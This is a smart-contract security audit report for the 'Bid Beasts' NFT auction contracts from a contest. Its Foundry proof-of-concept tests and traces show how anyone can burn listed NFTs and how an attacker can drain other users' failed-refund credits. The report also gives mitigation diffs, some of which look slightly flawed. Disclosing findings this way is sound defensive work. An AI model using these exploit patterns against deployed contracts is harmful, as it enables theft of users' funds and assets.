# Bid Beasts - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Lack of access control in `BidBeasts::burn()` function, allow malicious actors to burn BidBeasts NFTs](#H-01)
    - ### [H-02. Malicious Actor can steal other users’ Failed Refunds through `BidBeastsNFTMarket::withdrawAllFailedCredits(address)` function](#H-02)
- ## Medium Risk Findings
    - ### [M-01. Bad Practice: CEI pattern violated and Division before Mulipication](#M-01)
- ## Low Risk Findings
    - ### [L-01. Invariant Protocol Break, anyone cannot finalize auction after 3 days](#L-01)
    - ### [L-02. Lack of event emission for Critical Functions](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #49

### Dates: Sep 25th, 2025 - Oct 2nd, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-09-bid-beasts)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 2
- Medium: 1
- Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. Lack of access control in `BidBeasts::burn()` function, allow malicious actors to burn BidBeasts NFTs            



# Lack of access control in `BidBeasts::burn()` function, allow malicious actors to burns BidBeasts NFTs

## Description

The only person who can burn `BidBeast NFT` is the person who owns the NFT, but in the `BidBeasts` contract, the `BidBeasts::burn()` function does not have access control.

```Solidity
   //@audit-issue where is the access control? anyone could burn someone NFT's only by TokenId
@> function burn(uint256 _tokenId) public {
       _burn(_tokenId);
       emit BidBeastsBurn(msg.sender, _tokenId);
   }
```

## Risk

**Likelihood**:

* Malicious actors can burns those BidBeasts NFTs anytime as long those NFTs exist.

* A malicious actor can burn those BidBeasts NFTs simply by providing the token ID.

  <br />

**Impact**:

* BidBeasts NFTs marketplace will not function as it should as a marketplace.

* No Bidder would receive the NFT because the NFT is not exist anymore even the auction is ended.

* ETH stuck in the contract `BidBeastsNFTMarketPlace`

## Proof of Concept

copy the PoC and paste it in `BidBeastsNFTMarketPlaceTest.t.sol`

```Solidity
function test_maliciousActorCanBurnNFT() public {
    _mintNFT();
    _listNFT();
        
    // malicious actor burn the NFT
    vm.prank(maliciousActor);
    nft.burn(TOKEN_ID);

    // bidder place their bid without knowing the NFT is burned
    vm.prank(BIDDER_1);
    market.placeBid{value: MIN_PRICE + 1}(TOKEN_ID);
    market.getListing(TOKEN_ID);

    // auction end
    vm.warp(block.timestamp + 900);
        
    vm.expectRevert();
    // somebody call settleAuction
    vm.prank(BIDDER_2);
    market.settleAuction(TOKEN_ID);
}
```

the log:

```Solidity
[PASS] test_maliciousActorCanBurnNFT() (gas: 280892)
Traces:
  [356381] BidBeastsNFTMarketTest::test_maliciousActorCanBurnNFT()
    ├─ [0] VM::startPrank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return]
    ├─ [74067] BidBeasts::mint(SHA-256: [0x0000000000000000000000000000000000000002])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   ├─ emit BidBeastsMinted(to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   └─ ← [Return] 0
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return]
    ├─ [25508] BidBeasts::approve(BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   ├─ emit Approval(owner: SHA-256: [0x0000000000000000000000000000000000000002], approved: BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [128588] BidBeastsNFTMarket::listNFT(0, 1000000000000000000 [1e18], 5000000000000000000 [5e18])
    │   ├─ [1094] BidBeasts::ownerOf(0) [staticcall]
    │   │   └─ ← [Return] SHA-256: [0x0000000000000000000000000000000000000002]
    │   ├─ [29510] BidBeasts::transferFrom(SHA-256: [0x0000000000000000000000000000000000000002], BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   ├─ emit Transfer(from: SHA-256: [0x0000000000000000000000000000000000000002], to: BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0)
    │   │   └─ ← [Stop]
    │   ├─ emit NftListed(tokenId: 0, seller: SHA-256: [0x0000000000000000000000000000000000000002], minPrice: 1000000000000000000 [1e18], buyNowPrice: 5000000000000000000 [5e18])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(maliciousActor: [0x195Ef46F233F37FF15b37c022c293753Dc04A8C3])
    │   └─ ← [Return]
    ├─ [5552] BidBeasts::burn(0)
    │   ├─ emit Transfer(from: BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, tokenId: 0)
    │   ├─ emit BidBeastsBurn(from: maliciousActor: [0x195Ef46F233F37FF15b37c022c293753Dc04A8C3], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [0] VM::prank(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   └─ ← [Return]
    ├─ [72627] BidBeastsNFTMarket::placeBid{value: 1000000000000000001}(0)
    │   ├─ emit AuctionSettled(tokenId: 0, winner: RIPEMD-160: [0x0000000000000000000000000000000000000003], seller: SHA-256: [0x0000000000000000000000000000000000000002], price: 1000000000000000001 [1e18])
    │   ├─ emit AuctionExtended(tokenId: 0, newDeadline: 901)
    │   ├─ emit BidPlaced(tokenId: 0, bidder: RIPEMD-160: [0x0000000000000000000000000000000000000003], amount: 1000000000000000001 [1e18])
    │   └─ ← [Stop]
    ├─ [2122] BidBeastsNFTMarket::getListing(0) [staticcall]
    │   └─ ← [Return] Listing({ seller: 0x0000000000000000000000000000000000000002, minPrice: 1000000000000000000 [1e18], buyNowPrice: 5000000000000000000 [5e18], auctionEnd: 901, listed: true })
    ├─ [1403] BidBeastsNFTMarket::getHighestBid(0) [staticcall]
    │   └─ ← [Return] Bid({ bidder: 0x0000000000000000000000000000000000000003, amount: 1000000000000000001 [1e18] })
    ├─ [2122] BidBeastsNFTMarket::getListing(0) [staticcall]
    │   └─ ← [Return] Listing({ seller: 0x0000000000000000000000000000000000000002, minPrice: 1000000000000000000 [1e18], buyNowPrice: 5000000000000000000 [5e18], auctionEnd: 901, listed: true })
    ├─ [437] BidBeastsNFTMarket::S_AUCTION_EXTENSION_DURATION() [staticcall]
    │   └─ ← [Return] 900
    ├─ [0] VM::warp(901)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [0] VM::prank(Identity: [0x0000000000000000000000000000000000000004])
    │   └─ ← [Return]
    ├─ [7816] BidBeastsNFTMarket::settleAuction(0)
    │   ├─ [4316] BidBeasts::transferFrom(BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], RIPEMD-160: [0x0000000000000000000000000000000000000003], 0)
    │   │   └─ ← [Revert] ERC721NonexistentToken(0)
    │   └─ ← [Revert] ERC721NonexistentToken(0)
    └─ ← [Stop]
```

## Recommended Mitigation

Check is the `msg.sender` owned the BidBeast NFT

## <a id='H-02'></a>H-02. Malicious Actor can steal other users’ Failed Refunds through `BidBeastsNFTMarket::withdrawAllFailedCredits(address)` function            



# Malicious Actor can steal other users’ Failed Refunds through `BidBeastsNFTMarket::withdrawAllFailedCredits(address)` function

## Description

`BidBeastsNFTMarket::withdrawAllFailedCredits()`  Function does not verify that the caller is the same as the `_receiver` address. A malicious actor can steal the failed credits `_receiver` funds by simply entering the original `_receiver` address in the function parameter.

```Solidity
function withdrawAllFailedCredits(address _receiver) external {
@>  // No checks, is msg.sender == _receiver ?  
    // e get failedTransferCredits receiver
    uint256 amount = failedTransferCredits[_receiver];
    require(amount > 0, "No credits to withdraw");

    // e but, emptying failedTransferCredits sender
@>  failedTransferCredits[msg.sender] = 0;

    // e malicious actor steal failedTransferCredits receiver funds
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Withdraw failed");
}
```

## Risk

**Likelihood**:

* Malicious actor can steal failed credits funds whenever if a failed credit transfer occurs.

**Impact**:

* Amount refund of `_receiver` address stolen

* Fake mapping amount, confusing the original `_receiver` who want withdraw their own money

## Proof of Concept

Copy the PoC and paste in `BidBeastsMarketPlaceTest.sol`

```Solidity
function test_maliciousActorCanWitdrawFailedCredits() public {
    _mintNFT();
    _listNFT();

    vm.deal(address(rejector), STARTING_BALANCE);

    // address rejector become first bidder
    vm.prank(address(rejector));
    market.placeBid{value: MIN_PRICE + 1}(TOKEN_ID);

    // BIDDER_2 become second bidder and refund rejector amount bid
    // but refunding operation failed due to missing receive/fallback function in rejector contract
    // and then the refund amount is transferred to the failedTransferCredits mapping.
    vm.prank(BIDDER_2);
    market.placeBid{value: 1155000000000000000}(TOKEN_ID);

    // current highest bid is BIDDER_2
    market.getHighestBid(TOKEN_ID);

    uint256 failedCreditsBefore = address(market).balance;
    console.log("failed credits of address rejector before: ", failedCreditsBefore);
    uint256 maliciousActorBalanceBefore = address(maliciousActor).balance;
    console.log("malicious actor balance before: ", maliciousActorBalanceBefore);
    uint256 fakeMappingBefore = market.failedTransferCredits(address(rejector));
    console.log("fake mapping before: ", fakeMappingBefore);

    // malicious actor can steal funds of rejector failed credits due to arbitary address
    vm.prank(maliciousActor);
    market.withdrawAllFailedCredits(address(rejector));

    uint256 failedCreditsAfter = address(market).balance;
    console.log("failed credits of address rejector after: ", failedCreditsAfter);
    uint256 maliciousActorBalanceAfter = address(maliciousActor).balance;
    console.log("malicious actor balance after: ", maliciousActorBalanceAfter);
    uint256 fakeMappingAfter = market.failedTransferCredits(address(rejector));
    console.log("fake mapping after: ", fakeMappingAfter);

    assertEq(fakeMappingAfter, fakeMappingBefore);
    assertGt(maliciousActorBalanceAfter, maliciousActorBalanceBefore);
    assertLt(failedCreditsAfter, failedCreditsBefore);
}
```

the log:

```Solidity
 [431319] BidBeastsNFTMarketTest::test_maliciousActorCanWitdrawFailedCredits()
    ├─ [0] VM::startPrank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return]
    ├─ [74067] BidBeasts::mint(SHA-256: [0x0000000000000000000000000000000000000002])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   ├─ emit BidBeastsMinted(to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   └─ ← [Return] 0
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return]
    ├─ [25508] BidBeasts::approve(BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   ├─ emit Approval(owner: SHA-256: [0x0000000000000000000000000000000000000002], approved: BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [128588] BidBeastsNFTMarket::listNFT(0, 1000000000000000000 [1e18], 5000000000000000000 [5e18])
    │   ├─ [1094] BidBeasts::ownerOf(0) [staticcall]
    │   │   └─ ← [Return] SHA-256: [0x0000000000000000000000000000000000000002]
    │   ├─ [29510] BidBeasts::transferFrom(SHA-256: [0x0000000000000000000000000000000000000002], BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   ├─ emit Transfer(from: SHA-256: [0x0000000000000000000000000000000000000002], to: BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0)
    │   │   └─ ← [Stop]
    │   ├─ emit NftListed(tokenId: 0, seller: SHA-256: [0x0000000000000000000000000000000000000002], minPrice: 1000000000000000000 [1e18], buyNowPrice: 5000000000000000000 [5e18])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::deal(RejectEther: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000000000000000 [1e20])
    │   └─ ← [Return]
    ├─ [0] VM::prank(RejectEther: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   └─ ← [Return]
    ├─ [72627] BidBeastsNFTMarket::placeBid{value: 1000000000000000001}(0)
    │   ├─ emit AuctionSettled(tokenId: 0, winner: RejectEther: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], seller: SHA-256: [0x0000000000000000000000000000000000000002], price: 1000000000000000001 [1e18])
    │   ├─ emit AuctionExtended(tokenId: 0, newDeadline: 901)
    │   ├─ emit BidPlaced(tokenId: 0, bidder: RejectEther: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 1000000000000000001 [1e18])
    │   └─ ← [Stop]
    ├─ [0] VM::prank(Identity: [0x0000000000000000000000000000000000000004])
    │   └─ ← [Return]
    ├─ [37638] BidBeastsNFTMarket::placeBid{value: 1155000000000000000}(0)
    │   ├─ emit AuctionSettled(tokenId: 0, winner: Identity: [0x0000000000000000000000000000000000000004], seller: SHA-256: [0x0000000000000000000000000000000000000002], price: 1155000000000000000 [1.155e18])
    │   ├─ [23] RejectEther::fallback{value: 1000000000000000001}()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ emit BidPlaced(tokenId: 0, bidder: Identity: [0x0000000000000000000000000000000000000004], amount: 1155000000000000000 [1.155e18])
    │   └─ ← [Stop]
    ├─ [1403] BidBeastsNFTMarket::getHighestBid(0) [staticcall]
    │   └─ ← [Return] Bid({ bidder: 0x0000000000000000000000000000000000000004, amount: 1155000000000000000 [1.155e18] })
    ├─ [0] console::log("failed credits of address rejector before: ", 2155000000000000001 [2.155e18]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("malicious actor balance before: ", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [892] BidBeastsNFTMarket::failedTransferCredits(RejectEther: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   └─ ← [Return] 1000000000000000001 [1e18]
    ├─ [0] console::log("fake mapping before: ", 1000000000000000001 [1e18]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(maliciousActor: [0x195Ef46F233F37FF15b37c022c293753Dc04A8C3])
    │   └─ ← [Return]
    ├─ [35118] BidBeastsNFTMarket::withdrawAllFailedCredits(RejectEther: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   ├─ [0] maliciousActor::fallback{value: 1000000000000000001}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] console::log("failed credits of address rejector after: ", 1155000000000000000 [1.155e18]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("malicious actor balance after: ", 1000000000000000001 [1e18]) [staticcall]
    │   └─ ← [Stop]
    ├─ [892] BidBeastsNFTMarket::failedTransferCredits(RejectEther: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   └─ ← [Return] 1000000000000000001 [1e18]
    ├─ [0] console::log("fake mapping after: ", 1000000000000000001 [1e18]) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]
```

## Recommended Mitigation

Check the `msg.sender` and fix inconsistencies

```diff
function withdrawAllFailedCredits(address _receiver) external {
+    require(msg.sender == _receiver, "not owner"); // check who's call
     // e get failedTransferCredits receiver
     uint256 amount = failedTransferCredits[_receiver];
     require(amount > 0, "No credits to withdraw");

     // e but, emptying failedTransferCredits sender
-    failedTransferCredits[msg.sender] = 0;
+    failedTransferCredits[_receiver] = 0; // fix inconsistencies

    // e attacker steal failedTransferCredits receiver funds
-   (bool success, ) = payable(msg.sender).call{value: amount}("");
+   (bool success, ) = payable(_receiver).call{value: amount}(""); // fix inconsistencies
    require(success, "Withdraw failed");
}
```

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. Bad Practice: CEI pattern violated and Division before Mulipication            



# Bad Practice: CEI pattern violated and Division before Mulipication

## Description

1. **CEI pattern violated:** in `BidBeastNFTMarket::_executeSale()` function, no callback occured because protocol using `transferFrom` method.
2. **Div before Mul:** in `BidBeastsNFTMarket::placeBid` function for `nextBidder` required amount, no precision loss occoured. But, can confuse user/reviewer who see it for the first time.

* In `BidBeastsNFTMarket::_executeSale()` :

```Solidity
    /**
     * @notice Internal function to handle the final NFT transfer and payment distribution.
     */
    function _executeSale(uint256 tokenId) internal {
        Listing storage listing = listings[tokenId];
        Bid memory bid = bids[tokenId];

        listing.listed = false;
        delete bids[tokenId];

        //@audit-issue CEI pattern violated no reentrancy
 @>     BBERC721.transferFrom(address(this), bid.bidder, tokenId);
        uint256 fee = (bid.amount * S_FEE_PERCENTAGE) / 100;
        s_totalFee += fee;

        uint256 sellerProceeds = bid.amount - fee;
        _payout(listing.seller, sellerProceeds);

        emit AuctionSettled(tokenId, bid.bidder, listing.seller, bid.amount);
    }
```

* In `BidBeastsNFTMarket::placeBid()` :

```Solidity
function placeBid(uint256 tokenId) external payable isListed(tokenId) {
        ....

        ....

        ....

        } else {
            //@audit-issue low, bad practice division before multipication
            // can confuse user/reviewer who see it for the first time.
@>          requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
            require(msg.value >= requiredAmount, "Bid not high enough");

            uint256 timeLeft = 0;
            if (listing.auctionEnd > block.timestamp) {
                timeLeft = listing.auctionEnd - block.timestamp;
            }
            if (timeLeft < S_AUCTION_EXTENSION_DURATION) {
                listing.auctionEnd = listing.auctionEnd + S_AUCTION_EXTENSION_DURATION;
                emit AuctionExtended(tokenId, listing.auctionEnd);
            }
        }

        ....
    }
```

## Recommended Mitigation

* for `BidBeastsNFTMarket::_executeSale()` :

```diff
    /**
     * @notice Internal function to handle the final NFT transfer and payment distribution.
     */
    function _executeSale(uint256 tokenId) internal {
        Listing storage listing = listings[tokenId];
        Bid memory bid = bids[tokenId];

        listing.listed = false;
        delete bids[tokenId];

-       BBERC721.transferFrom(address(this), bid.bidder, tokenId);
        uint256 fee = (bid.amount * S_FEE_PERCENTAGE) / 100;
        s_totalFee += fee;

        uint256 sellerProceeds = bid.amount - fee;
        _payout(listing.seller, sellerProceeds); // pay the seller first
+       BBERC721.transferFrom(address(this), bid.bidder, tokenId);

        emit AuctionSettled(tokenId, bid.bidder, listing.seller, bid.amount);
    }
```

 \* for `BidBeastsNFTMarket::placeBid()` :

```diff
function placeBid(uint256 tokenId) external payable isListed(tokenId) {
        ....

        ....

        ....

        } else {
-           requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
+           requiredAmount = (previousBidAmount * (100 + S_MIN_BID_INCREMENT_PERCENTAGE) / 100;
            require(msg.value >= requiredAmount, "Bid not high enough"); 

            uint256 timeLeft = 0;
            if (listing.auctionEnd > block.timestamp) {
                timeLeft = listing.auctionEnd - block.timestamp;
            }
            if (timeLeft < S_AUCTION_EXTENSION_DURATION) {
                listing.auctionEnd = listing.auctionEnd + S_AUCTION_EXTENSION_DURATION;
                emit AuctionExtended(tokenId, listing.auctionEnd);
            }
        }

        ....
    }
```


# Low Risk Findings

## <a id='L-01'></a>L-01. Invariant Protocol Break, anyone cannot finalize auction after 3 days            



# Invariant Protocol Break, anyone cannot finalize auction after 3 days

## Description

* Anyone can finalize the auction after 3 days,  according to the contest detail "After 3 days, anyone can call `endAuction(tokenId)` to finalize the auction." is designed to prevent the auction from taking too long even `listing.auctionEnd` > 3 days.

* Unfortunately, in function `BidBeastsNFTMarket::settleAuction()` there is no checks that if an auction has been ongoing for 3 days. The function only checks for `listing.auctionEnd` which is its dynamic deadline and it can exceed more than 3 days if there's many bidders come in.

```Solidity
 function settleAuction(uint256 tokenId) external isListed(tokenId) {
@>  // no checks if auction is already going on for 3 days or not
   // according to the contest detail "After 3 days, anyone can call `endAuction(tokenId)` to finalize the auction."
   // auction could exceeds more than 3 days and never finalize
   Listing storage listing = listings[tokenId];
   require(listing.auctionEnd > 0, "Auction has not started (no bids)");
   require(block.timestamp >= listing.auctionEnd, "Auction has not ended");
   require(bids[tokenId].amount >= listing.minPrice, "Highest bid did not meet min price");

   _executeSale(tokenId);
 }
```

## Risk

**Likelihood**:

* When auction has been ongoing for 3 days

**Impact**:

* Invariant Protocol Break

* It can confuse whoever call the function `BidBeastsNFTMarket::settleAuction()`  to finalized the auction

## Proof of Concept

Simplified for testing:

```solidity
    uint256 constant public S_AUCTION_EXTENSION_DURATION = 4 days; 
```

copy and paste the PoC to `BidBeastMarketPlaceTest.t.sol`

```Solidity
function test_auctionCannotFinalizeAfter3days() public {
        _mintNFT();
        _listNFT();

        // BIDDER_1 place the frist bid
        vm.prank(BIDDER_1);
        market.placeBid{value: MIN_PRICE + 1}(TOKEN_ID);
        
        // simplified S_AUCTION_EXTENSION_DURATION = 4 days;
        BidBeastsNFTMarket.Listing memory list = market.getListing(TOKEN_ID);
        assertEq(4 days + 1, list.auctionEnd);
        
        vm.warp(block.timestamp + 3 days);

        // will revert due to "Auction has not ended" even its already more than 3 days
        vm.expectRevert();
        vm.prank(BIDDER_2);
        market.settleAuction(TOKEN_ID);
    }
```

the log:

```Solidity
 [332591] BidBeastsNFTMarketTest::test_auctionCannotFinalizeAfter3days()
    ├─ [0] VM::startPrank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return]
    ├─ [74067] BidBeasts::mint(SHA-256: [0x0000000000000000000000000000000000000002])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   ├─ emit BidBeastsMinted(to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   └─ ← [Return] 0
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return]
    ├─ [25508] BidBeasts::approve(BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   ├─ emit Approval(owner: SHA-256: [0x0000000000000000000000000000000000000002], approved: BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [128588] BidBeastsNFTMarket::listNFT(0, 1000000000000000000 [1e18], 5000000000000000000 [5e18])
    │   ├─ [1094] BidBeasts::ownerOf(0) [staticcall]
    │   │   └─ ← [Return] SHA-256: [0x0000000000000000000000000000000000000002]
    │   ├─ [29510] BidBeasts::transferFrom(SHA-256: [0x0000000000000000000000000000000000000002], BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   ├─ emit Transfer(from: SHA-256: [0x0000000000000000000000000000000000000002], to: BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0)
    │   │   └─ ← [Stop]
    │   ├─ emit NftListed(tokenId: 0, seller: SHA-256: [0x0000000000000000000000000000000000000002], minPrice: 1000000000000000000 [1e18], buyNowPrice: 5000000000000000000 [5e18])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   └─ ← [Return]
    ├─ [72627] BidBeastsNFTMarket::placeBid{value: 1000000000000000001}(0)
    │   ├─ emit AuctionSettled(tokenId: 0, winner: RIPEMD-160: [0x0000000000000000000000000000000000000003], seller: SHA-256: [0x0000000000000000000000000000000000000002], price: 1000000000000000001 [1e18])
    │   ├─ emit AuctionExtended(tokenId: 0, newDeadline: 345601 [3.456e5])
    │   ├─ emit BidPlaced(tokenId: 0, bidder: RIPEMD-160: [0x0000000000000000000000000000000000000003], amount: 1000000000000000001 [1e18])
    │   └─ ← [Stop]
    ├─ [2122] BidBeastsNFTMarket::getListing(0) [staticcall]
    │   └─ ← [Return] Listing({ seller: 0x0000000000000000000000000000000000000002, minPrice: 1000000000000000000 [1e18], buyNowPrice: 5000000000000000000 [5e18], auctionEnd: 345601 [3.456e5], listed: true })
    ├─ [0] VM::warp(259201 [2.592e5])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [0] VM::prank(Identity: [0x0000000000000000000000000000000000000004])
    │   └─ ← [Return]
    ├─ [1311] BidBeastsNFTMarket::settleAuction(0)
    │   └─ ← [Revert] Auction has not ended
    └─ ← [Stop]
```

## Recommended Mitigation

so track `auctionStart` in `BidBeastsNFTMarket::listNFT()` function and in `BidBeastsNFTMarket::settleAuction()` checks if block.timestamp >= auctionStart + 3 days, anyone can finalize, even though `auctionEnd` is still in the future due to extension.

append `auctionStart` in struct Listing:

```diff
struct Listing {
        address seller;
        uint256 minPrice;
        uint256 buyNowPrice; 
+       uint256 auctionStart;
        uint256 auctionEnd;
        bool listed;
    }
```

create new constant variable:

```diff
+    uint256 constant public S_MAX_AUCTION_DURATION = 3 days;
```

update `BidBeastsNFTMarket::listNFT()` function:

```diff
function listNFT(uint256 tokenId, uint256 _minPrice, uint256 _buyNowPrice) external {
        ....

        listings[tokenId] = Listing({
            seller: msg.sender,
            minPrice: _minPrice,
            buyNowPrice: _buyNowPrice,
+           auctionStart: block.timestamp,
            auctionEnd: 0, // Timer starts only after the first valid bid.
            listed: true
        });

        emit NftListed(tokenId, msg.sender, _minPrice, _buyNowPrice);
    }
```

update `BidBeastsNFTMarket::settleAuction()` function:

```diff
function settleAuction(uint256 tokenId) external isListed(tokenId) {
    Listing storage listing = listings[tokenId];
    require(listing.auctionEnd > 0, "Auction has not started (no bids)");
-   require(block.timestamp >= listing.auctionEnd, "Auction has not ended");
+   bool reachedDeadline = block.timestamp >= listing.auctionEnd;
+   bool reachedMaxDuration = block.timestamp >= (listing.auctionStart + S_MAX_AUCTION_DURATION);
+   require(reachedDeadline || reachedMaxDuration, "Auction has not ended");
    require(bids[tokenId].amount >= listing.minPrice, "Highest bid did not meet min price");

    _executeSale(tokenId);
}
```

## <a id='L-02'></a>L-02. Lack of event emission for Critical Functions            



# Lack of event emission for Critical Functions

## Description

There is lack of event emission for Critical Functions such as:

1. `BidBeastsNFTMarket::_payout()`, whenever the transfer is failed its amounts is transfered into `failedTransferCredits` mapping without emitting an event.
2. `BidBeastNFTMarket::withdrawAllFailedCredits()`, so the failed transfered amounts from `BidBeastsNFTMarket::_payout()` can be withdrawn by calling this function. Unfortunately, this function also not emitting an event whenever someone withdraw.

* In `BidBeastsNFTMarket::_payout()` function :

```Solidity
    function _payout(address recipient, uint256 amount) internal {
        if (amount == 0) return;
        (bool success, ) = payable(recipient).call{value: amount}("");
        if (!success) {
            failedTransferCredits[recipient] += amount;
@>         // no event emission
        }
    }
```

* In `BidBeastNFTMarket::withdrawAllFailedCredits()` function :

```Solidity
function withdrawAllFailedCredits(address _receiver) external {
        uint256 amount = failedTransferCredits[_receiver];
        require(amount > 0, "No credits to withdraw");

        failedTransferCredits[msg.sender] = 0;

        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdraw failed");
@>     // no event emission
    }
```

## Risk

**Likelihood**:

* When User/Bidder is a contract and the contract does not implement `receive()/fallback()` function its amounts is transfered into `failedTransferCredits` mapping

**Impact**:

* It will confuse user/bidder, espeacially when `_payout` failed

## Recommended Mitigation

create new events for `_payout` and `withdrawAllFailedCredits`

```diff
+    event FailedTransfer(address to, uint256 amount);
+    event WithdrawFailedCredits(address to, uint256 amount);

function _payout(address recipient, uint256 amount) internal {
        if (amount == 0) return;
        (bool success, ) = payable(recipient).call{value: amount}("");
        if (!success) {
           failedTransferCredits[recipient] += amount;
+          emit FailedTransfer(recipient, amount)
        }
     }

function withdrawAllFailedCredits(address _receiver) external {
        uint256 amount = failedTransferCredits[_receiver];
        require(amount > 0, "No credits to withdraw");

        failedTransferCredits[msg.sender] = 0;

+       emit WithdrawFailedCredits(msg.sender, amount);
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdraw failed");
    }
```



